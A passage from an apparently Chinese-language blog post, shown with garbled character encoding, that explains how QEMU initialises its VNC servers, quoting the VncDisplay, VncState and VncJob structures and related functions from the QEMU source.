·å®šä¹‰äº <code>ui/console.c</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">qemu_display_init</span><span class="params">(DisplayState *ds, DisplayOptions *opts)</span></span><br><span class="line">&#123;</span><br><span class="line">    assert(opts-&gt;type &lt; DISPLAY_TYPE__MAX);</span><br><span class="line">    <span class="keyword">if</span> (opts-&gt;type == DISPLAY_TYPE_NONE) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    assert(dpys[opts-&gt;type] != <span class="literal">NULL</span>);</span><br><span class="line">    dpys[opts-&gt;type]-&gt;init(ds, opts);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„ dpys æ˜¯ä¸€ä¸ª <code>QemuDisplay</code> ç±»å‹çš„å…¨å±€æ•°ç»„ï¼Œå®šä¹‰äº <code>ui/console.c</code> ä¸­ï¼Œè¡¨ç¤º Qemu æ‰€æ”¯æŒçš„æ‰€æœ‰æ˜¾ç¤ºç±»å‹ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>qemu_display_register()</code> å°†æ˜¾ç¤ºç±»å‹æ³¨å†Œåˆ°è¯¥æ•°ç»„ä¸­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> QemuDisplay *dpys[DISPLAY_TYPE__MAX];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">qemu_display_register</span><span class="params">(QemuDisplay *ui)</span></span><br><span class="line">&#123;</span><br><span class="line">    assert(ui-&gt;type &lt; DISPLAY_TYPE__MAX);</span><br><span class="line">    dpys[ui-&gt;type] = ui;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>QemuDisplay</code> ç»“æ„ä½“å®šä¹‰äº <code>ui/console.h</code> ä¸­ï¼Œè¡¨ç¤º Qemu æ‰€æ”¯æŒçš„å•ä¸ªæ˜¾ç¤ºç±»å‹ï¼Œä¸»è¦å°±æ˜¯ç±»å‹ + åˆå§‹åŒ–çš„å‡½æ•°æŒ‡é’ˆï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">QemuDisplay</span> &#123;</span></span><br><span class="line">    DisplayType type;</span><br><span class="line">    <span class="type">void</span> (*early_init)(DisplayOptions *opts);</span><br><span class="line">    <span class="type">void</span> (*init)(DisplayState *ds, DisplayOptions *opts);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>ä¸è¿‡ç»ç¬”è€…è°ƒè¯•é€šå¸¸æƒ…å†µä¸‹ä¸ç‰¹å®šæŒ‡å®šçš„è¯éƒ½ä¼šæ˜¯ <code>DISPLAY_TYPE_NONE</code> </p></blockquote><h1 id="0x02-vnc-init-func-åˆå§‹åŒ–å•ä¸ª-VNC-Server"><a href="#0x02-vnc-init-func-åˆå§‹åŒ–å•ä¸ª-VNC-Server" class="headerlink" title="0x02. vnc_init_func() - åˆå§‹åŒ–å•ä¸ª VNC Server"></a>0x02. vnc_init_func() - åˆå§‹åŒ–å•ä¸ª VNC Server</h1><p>åœ¨ä¸€ä¸ª Qemu å®ä¾‹å½“ä¸­ï¼Œæˆ‘ä»¬é€šå¸¸åªä¼šä½¿ç”¨åˆ°ä¸€ä¸ª VGA è®¾å¤‡ï¼ˆä¹Ÿå¯ä»¥å¤šä¸ªï¼‰ï¼Œä¸è¿‡æˆ‘ä»¬å¯ä»¥åŒæ—¶å¯åŠ¨å¤šä¸ª VNC Serverï¼Œä¾‹å¦‚æˆ‘ä»¬å¯ä»¥é™„åŠ å¯åŠ¨å‚æ•° <code>-vnc yourip:0 -vnc yourip:1</code>ï¼Œæ­¤æ—¶ Qemu å°±ä¼šåœ¨ 5700 ä¸ 5701 ç«¯å£ä¸Šå¯åŠ¨ä¸¤ä¸ª VNC æœåŠ¡å™¨ï¼Œè€Œæ¯ä¸ª VNC Server çš„å¯åŠ¨éƒ½æ˜¯é€šè¿‡ <code>vnc_init_func()</code> æ¥å®Œæˆçš„</p><p>å½“æˆ‘ä»¬åªæœ‰ä¸€ä¸ª VGA è®¾å¤‡è¾“å‡ºæ—¶ï¼Œå…¶è¾“å‡ºä¼šè¢«åŒæ—¶æ›´æ–°ç»™å¤šä¸ª VNC Clientï¼Œæ­¤æ—¶å¤šä¸ª VNC Client æ‰€è·å–åˆ°çš„ç”»é¢æ˜¯ç›¸åŒçš„</p><p><code>vnc_init_func()</code> å®šä¹‰äº <code>ui/vnc.c</code> ä¸­ï¼Œæ¯”è¾ƒç®€çŸ­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">vnc_init_func</span><span class="params">(<span class="type">void</span> *opaque, QemuOpts *opts, Error **errp)</span></span><br><span class="line">&#123;</span><br><span class="line">    Error *local_err = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">char</span> *id = (<span class="type">char</span> *)qemu_opts_id(opts);</span><br><span class="line"></span><br><span class="line">    assert(id);</span><br><span class="line">    vnc_display_init(id, &amp;local_err);</span><br><span class="line">    <span class="keyword">if</span> (local_err) &#123;</span><br><span class="line">        error_propagate(errp, local_err);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    vnc_display_open(id, &amp;local_err);</span><br><span class="line">    <span class="keyword">if</span> (local_err != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        error_propagate(errp, local_err);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸»è¦åšäº†ä¸¤ä»¶äº‹ï¼š</p><ul><li><code>vnc_display_init()</code>ï¼šåˆå§‹åŒ–ä¸€ä¸ª <code>VncDisplay</code> å®ä¾‹</li><li><code>vnc_display_open()</code>ï¼šå¯åŠ¨ä¸€ä¸ª VNC Server</li></ul><p><code>vnc_display_open()</code> ä¸»è¦å°±æ˜¯å•çº¯çš„åˆ›å»ºä¸€ä¸ªæ™®é€šçš„ serverï¼Œä»¥åŠä¸€äº›å’Œ VNC åè®®å…·ä½“ç»†èŠ‚ç›¸å…³çš„éƒ¨åˆ†ï¼Œæ•…æˆ‘ä»¬æ¥ä¸‹æ¥ä¸»è¦åˆ†æ <code>vnc_display_init()</code></p><h2 id="ã€‡ã€VNC-ç›¸å…³ç»“æ„ä½“"><a href="#ã€‡ã€VNC-ç›¸å…³ç»“æ„ä½“" class="headerlink" title="ã€‡ã€VNC ç›¸å…³ç»“æ„ä½“"></a>ã€‡ã€VNC ç›¸å…³ç»“æ„ä½“</h2><h3 id="Iã€VncDisplay-å•ä¸ª-VNC-Server-å®ä¾‹"><a href="#Iã€VncDisplay-å•ä¸ª-VNC-Server-å®ä¾‹" class="headerlink" title="Iã€VncDisplay - å•ä¸ª VNC Server å®ä¾‹"></a>Iã€VncDisplay - å•ä¸ª VNC Server å®ä¾‹</h3><p>è¯¥ç»“æ„ä½“å®šä¹‰äº <code>ui/vnc.h</code> ä¸­ï¼Œè¡¨ç¤ºå•ä¸ª VNC Server å®ä¾‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">VncDisplay</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    QTAILQ_HEAD(, VncState) clients;</span><br><span class="line">    <span class="type">int</span> num_connecting;</span><br><span class="line">    <span class="type">int</span> num_shared;</span><br><span class="line">    <span class="type">int</span> num_exclusive;</span><br><span class="line">    <span class="type">int</span> connections_limit;</span><br><span class="line">    VncSharePolicy share_policy;</span><br><span class="line">    QIONetListener *listener;</span><br><span class="line">    QIONetListener *wslistener;</span><br><span class="line">    DisplaySurface *ds;</span><br><span class="line">    DisplayChangeListener dcl;</span><br><span class="line">    <span class="type">kbd_layout_t</span> *kbd_layout;</span><br><span class="line">    <span class="type">int</span> lock_key_sync;</span><br><span class="line">    QEMUPutLEDEntry *led;</span><br><span class="line">    <span class="type">int</span> ledstate;</span><br><span class="line">    QKbdState *kbd;</span><br><span class="line">    QemuMutex mutex;</span><br><span class="line"></span><br><span class="line">    QEMUCursor *cursor;</span><br><span class="line">    <span class="type">int</span> cursor_msize;</span><br><span class="line">    <span class="type">uint8_t</span> *cursor_mask;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">VncSurface</span> <span class="title">guest</span>;</span>   <span class="comment">/* guest visible surface (aka ds-&gt;surface) */</span></span><br><span class="line">    <span class="type">pixman_image_t</span> *server;    <span class="comment">/* vnc server surface */</span></span><br><span class="line">    <span class="type">int</span> true_width; <span class="comment">/* server surface width before rounding up */</span></span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *id;</span><br><span class="line">    QTAILQ_ENTRY(VncDisplay) next;</span><br><span class="line">    <span class="type">bool</span> is_unix;</span><br><span class="line">    <span class="type">char</span> *password;</span><br><span class="line">    <span class="type">time_t</span> expires;</span><br><span class="line">    <span class="type">int</span> auth;</span><br><span class="line">    <span class="type">int</span> subauth; <span class="comment">/* Used by VeNCrypt */</span></span><br><span class="line">    <span class="type">int</span> ws_auth; <span class="comment">/* Used by websockets */</span></span><br><span class="line">    <span class="type">int</span> ws_subauth; <span class="comment">/* Used by websockets */</span></span><br><span class="line">    <span class="type">bool</span> lossy;</span><br><span class="line">    <span class="type">bool</span> non_adaptive;</span><br><span class="line">    <span class="type">bool</span> power_control;</span><br><span class="line">    QCryptoTLSCreds *tlscreds;</span><br><span class="line">    QAuthZ *tlsauthz;</span><br><span class="line">    <span class="type">char</span> *tlsauthzid;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_VNC_SASL</span></span><br><span class="line">    VncDisplaySASL sasl;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    AudioState *audio_state;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ä¸»è¦å…³æ³¨è¿™å‡ ä¸ªæˆå‘˜å˜é‡ï¼š</p><ul><li><code>clients</code>ï¼šè¿æ¥åˆ°è¯¥æœåŠ¡å™¨ä¸Šçš„æ‰€æœ‰å®¢æˆ·ç«¯ï¼Œæ¯ä¸ªå®¢æˆ·ç«¯ä¸ºä¸€ä¸ª <code>VncClient</code> å®ä¾‹ï¼Œå¤šä¸ª <code>VncClient</code> å®ä¾‹é—´å½¢æˆä¸€ä¸ªé“¾è¡¨</li><li><code>ds</code>ï¼š</li><li><code>dcl</code>ï¼šè¯¥ VNC Server æ‰€ç›‘å¬çš„ QemuConsole çš„ç›‘å¬å™¨ï¼Œå½“å¯¹åº”çš„ QemuConsole å‘ç”Ÿæ›´æ”¹æ—¶ä¾¿ä¼šè°ƒç”¨ <code>dcl-&gt;ops</code> ä¸­å¯¹åº”å‡½æ•°æŒ‡é’ˆ</li><li><code>next</code>ï¼šå¤šä¸ª VncDisplay ä¹‹é—´äº’ç›¸è¿æ¥å½¢æˆä¸€ä¸ªé“¾è¡¨</li></ul><p>åŒæ—¶å­˜åœ¨ç€ä¸€ä¸ªå…¨å±€å˜é‡ <code>vnc_displays</code>ï¼ŒQemu ä¸­æ‰€æœ‰çš„ VncDisplay éƒ½æŒ‚è½½åœ¨è¯¥é“¾è¡¨ä¸Šï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="title function_">QTAILQ_HEAD</span><span class="params">(, VncDisplay)</span> vnc_displays =</span><br><span class="line">    QTAILQ_HEAD_INITIALIZER(vnc_displays);</span><br></pre></td></tr></table></figure><h3 id="IIã€VncState-å•ä¸ª-VNC-è¿æ¥ï¼ˆVNC-Clientï¼‰"><a href="#IIã€VncState-å•ä¸ª-VNC-è¿æ¥ï¼ˆVNC-Clientï¼‰" class="headerlink" title="IIã€VncState - å•ä¸ª VNC è¿æ¥ï¼ˆVNC Clientï¼‰"></a>IIã€VncState - å•ä¸ª VNC è¿æ¥ï¼ˆVNC Clientï¼‰</h3><p>è¯¥ç»“æ„ä½“å®šä¹‰äº <code>ui/vnc.h</code> ä¸­ï¼Œè¡¨ç¤ºè¿æ¥åˆ°ç‰¹å®š VNC Server ä¸Šçš„å•ä¸ª VNC Client å®ä¾‹ï¼Œå…¶ä¸­åŒ…å«å®¢æˆ·ç«¯çš„å„ç§ä¿¡æ¯ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">VncState</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">uint64_t</span> magic;</span><br><span class="line">    QIOChannelSocket *sioc; <span class="comment">/* The underlying socket */</span></span><br><span class="line">    QIOChannel *ioc; <span class="comment">/* The channel currently used for I/O */</span></span><br><span class="line">    guint ioc_tag;</span><br><span class="line">    gboolean disconnecting;</span><br><span class="line"></span><br><span class="line">    DECLARE_BITMAP(dirty[VNC_MAX_HEIGHT], VNC_DIRTY_BITS);</span><br><span class="line">    <span class="type">uint8_t</span> **lossy_rect; <span class="comment">/* Not an Array to avoid costly memcpy in</span></span><br><span class="line"><span class="comment">                           * vnc-jobs-async.c */</span></span><br><span class="line"></span><br><span class="line">    VncDisplay *vd;</span><br><span class="line">    VncStateUpdate update; <span class="comment">/* Most recent pending request from client */</span></span><br><span class="line">    VncStateUpdate job_update; <span class="comment">/* Currently processed by job thread */</span></span><br><span class="line">    <span class="type">int</span> has_dirty;</span><br><span class="line">    <span class="type">uint32_t</span> features;</span><br><span class="line">    <span class="type">int</span> absolute;</span><br><span class="line">    <span class="type">int</span> last_x;</span><br><span class="line">    <span class="type">int</span> last_y;</span><br><span class="line">    <span class="type">uint32_t</span> last_bmask;</span><br><span class="line">    <span class="type">size_t</span> client_width; <span class="comment">/* limited to u16 by RFB proto */</span></span><br><span class="line">    <span class="type">size_t</span> client_height; <span class="comment">/* limited to u16 by RFB proto */</span></span><br><span class="line">    VncShareMode share_mode;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> vnc_encoding;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> major;</span><br><span class="line">    <span class="type">int</span> minor;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> auth;</span><br><span class="line">    <span class="type">int</span> subauth; <span class="comment">/* Used by VeNCrypt */</span></span><br><span class="line">    <span class="type">char</span> challenge[VNC_AUTH_CHALLENGE_SIZE];</span><br><span class="line">    QCryptoTLSSession *tls; <span class="comment">/* Borrowed pointer from channel, don&#x27;t free */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_VNC_SASL</span></span><br><span class="line">    VncStateSASL sasl;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="type">bool</span> encode_ws;</span><br><span class="line">    <span class="type">bool</span> websocket;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_VNC</span></span><br><span class="line">    VncClientInfo *info;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Job thread bottom half has put data for a forced update</span></span><br><span class="line"><span class="comment">     * into the output buffer. This offset points to the end of</span></span><br><span class="line"><span class="comment">     * the update data in the output buffer. This lets us determine</span></span><br><span class="line"><span class="comment">     * when a force update is fully sent to the client, allowing</span></span><br><span class="line"><span class="comment">     * us to process further forced updates. */</span></span><br><span class="line">    <span class="type">size_t</span> force_update_offset;</span><br><span class="line">    <span class="comment">/* We allow multiple incremental updates or audio capture</span></span><br><span class="line"><span class="comment">     * samples to be queued in output buffer, provided the</span></span><br><span class="line"><span class="comment">     * buffer size doesn&#x27;t exceed this threshold. The value</span></span><br><span class="line"><span class="comment">     * is calculating dynamically based on framebuffer size</span></span><br><span class="line"><span class="comment">     * and audio sample settings in vnc_update_throttle_offset() */</span></span><br><span class="line">    <span class="type">size_t</span> throttle_output_offset;</span><br><span class="line">    Buffer output;</span><br><span class="line">    Buffer input;</span><br><span class="line">    <span class="comment">/* current output mode information */</span></span><br><span class="line">    VncWritePixels *write_pixels;</span><br><span class="line">    PixelFormat client_pf;</span><br><span class="line">    <span class="type">pixman_format_code_t</span> client_format;</span><br><span class="line">    <span class="type">bool</span> client_be;</span><br><span class="line"></span><br><span class="line">    CaptureVoiceOut *audio_cap;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">audsettings</span> <span class="title">as</span>;</span></span><br><span class="line"></span><br><span class="line">    VncReadEvent *read_handler;</span><br><span class="line">    <span class="type">size_t</span> read_handler_expect;</span><br><span class="line"></span><br><span class="line">    <span class="type">bool</span> <span class="built_in">abort</span>;</span><br><span class="line">    QemuMutex output_mutex;</span><br><span class="line">    QEMUBH *bh;</span><br><span class="line">    Buffer jobs_buffer;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Encoding specific, if you add something here, don&#x27;t forget to</span></span><br><span class="line"><span class="comment">     *  update vnc_async_encoding_start()</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    VncTight *tight;</span><br><span class="line">    VncZlib zlib;</span><br><span class="line">    VncHextile hextile;</span><br><span class="line">    VncZrle *zrle;</span><br><span class="line">    VncZywrle zywrle;</span><br><span class="line"></span><br><span class="line">    Notifier mouse_mode_notifier;</span><br><span class="line"></span><br><span class="line">    QemuClipboardPeer cbpeer;</span><br><span class="line">    QemuClipboardInfo *cbinfo;</span><br><span class="line">    <span class="type">uint32_t</span> cbpending;</span><br><span class="line"></span><br><span class="line">    QTAILQ_ENTRY(VncState) next;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>åœ¨åŒä¸€ä¸ª VncDisplay ï¼ˆVNC Serverï¼‰ä¸‹çš„æ‰€æœ‰ VncStateï¼ˆVNC Clientï¼‰è¿æ¥æˆä¸€ä¸ªé“¾è¡¨</p><h3 id="IIIã€VncJob-å•ä¸ª-VNC-è¿æ¥å•æ¬¡éœ€è¦æ›´æ–°çš„å›¾åƒä¿¡æ¯"><a href="#IIIã€VncJob-å•ä¸ª-VNC-è¿æ¥å•æ¬¡éœ€è¦æ›´æ–°çš„å›¾åƒä¿¡æ¯" class="headerlink" title="IIIã€VncJob - å•ä¸ª VNC è¿æ¥å•æ¬¡éœ€è¦æ›´æ–°çš„å›¾åƒä¿¡æ¯"></a>IIIã€VncJob - å•ä¸ª VNC è¿æ¥å•æ¬¡éœ€è¦æ›´æ–°çš„å›¾åƒä¿¡æ¯</h3><p>VncJob ç»“æ„ä½“ç”¨æ¥è¡¨ç¤ºå•ä¸ª VNC è¿æ¥ï¼ˆVncStateï¼‰å•æ¬¡éœ€è¦æ›´æ–°çš„å›¾åƒä¿¡æ¯ï¼Œå®šä¹‰äº <code>ui/vnc.h</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">VncJob</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    VncState *vs;</span><br><span class="line"></span><br><span class="line">    QLIST_HEAD(, VncRectEntry) rectangles;</span><br><span class="line">    QTAILQ_ENTRY(VncJob) next;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>åœ¨å•æ¬¡çš„å›¾åƒæ›´æ–°å½“ä¸­ï¼Œå•ä¸ªçŸ©å½¢åŒºåŸŸå…·ä½“çš„çš„æ›´æ–°ä¿¡æ¯ä½¿ç”¨ <code>VncRectEntry</code> ç»“æ„ä½“è¡¨ç¤ºï¼Œå•ä¸ª VncJob ä¸­å¯ä»¥æœ‰å¤šä¸ª VncRectEntryï¼Œä»–ä»¬ä¹‹é—´å½¢æˆä¸€ä¸ªå•å‘é“¾è¡¨ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">VncRect</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line">    <span class="type">int</span> y;</span><br><span class="line">    <span class="type">int</span> w;</span><br><span class="line">    <span class="type">int</span> h;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">VncRectEntry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">VncRect</span> <span class="title">rect</span>;</span></span><br><span class="line">    QLIST_ENTRY(VncRectEntry) next;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å¤šä¸ª VncJob ä¹‹é—´ä¹Ÿæ„æˆä¸€ä¸ªå•å‘é“¾è¡¨ï¼Œæœ€ç»ˆæŒ‚è½½åˆ°ä¸€ä¸ª <code>VncJobQueue</code> ç»“æ„ä½“ä¸Šï¼Œè¯¥ç»“æ„ä½“å®šä¹‰äº <code>ui/vnc-jobs.c</code> ä¸­</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">VncJobQueue</span> &#123;</span></span><br><span class="line">    QemuCond cond;</span><br><span class="line">    QemuMutex mutex;</span><br><span class="line">    QemuThread thread;</span><br><span class="line">    <span class="type">bool</span> <span class="built_in">exit</span>;</span><br><span class="line">    QTAILQ_HEAD(, VncJob) jobs;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">VncJobQueue</span> <span class="title">VncJobQueue</span>;</span></span><br></pre></td></tr></table></figure><p>åŒæ—¶æˆ‘ä»¬å­˜åœ¨ç€ä¸€ä¸ªå…¨å±€çš„ VncJobQueueï¼Œé»˜è®¤æƒ…å†µä¸‹æˆ‘ä»¬ä¼šå°† VncJob æŒ‚è½½åˆ°ä¸Šé¢ï¼ŒåŒæ—¶ vnc worker threadï¼ˆè´Ÿè´£å°†å›¾åƒä¿¡æ¯å‘é€ç»™ client çš„çº¿ç¨‹ï¼‰ä¹Ÿæ˜¯ä¸»è¦ä¾èµ–äºè¿™ä¸ªå…¨å±€çš„ queue</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * We use a single global queue, but most of the functions are</span></span><br><span class="line"><span class="comment"> * already reentrant, so we can easily add more than one encoding thread</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> VncJobQueue *<span class="built_in">queue</span>;</span><br></pre></td></tr></table></figure><h2 id="ä¸€ã€vnc-display-init"><a href="#ä¸€ã€vnc-display-init" class="headerlink" title="ä¸€ã€vnc_display_init()"></a>ä¸€ã€vnc_display_init()</h2><p>è¯¥å‡½æ•°ä¸»è¦ä½œç”¨ä¾¿æ˜¯åˆå§‹åŒ–ä¸€ä¸ª <code>VncDisplay</code> ç»“æ„ä½“ï¼Œå®šä¹‰äº <code>ui/vnc.c</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">vnc_display_init</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *id, Error **errp)</span></span><br><span class="line">&#123;</span><br><span class="line">    VncDisplay *vd;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (vnc_display_find(id) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    vd = g_malloc0(<span 